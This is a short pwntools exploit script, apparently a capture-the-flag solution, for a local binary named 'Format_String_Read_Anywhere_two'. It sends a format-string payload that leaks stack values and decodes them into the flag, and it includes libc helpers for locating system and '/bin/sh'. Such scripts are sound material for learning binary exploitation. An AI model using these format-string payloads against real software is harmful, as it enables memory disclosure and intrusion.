from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = process('./Format_String_Read_Anywhere_two')
elf = ELF('./Format_String_Read_Anywhere_two')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#debug('b *$rebase(0x12b7)')

sa(b'>>\n', b'%8$p.%9$p.')
a = rl(b'.')[2:-1][::-1]
b = rl(b'.')[2:-1][::-1]
flag = ''
for i in range(0, len(a), 2):
	c = a[i:i+2][::-1]
	flag += chr(int(c, 16))
for i in range(0, len(b), 2):
	c = b[i:i+2][::-1]
	flag += chr(int(c, 16))
	
print(flag)

pause()
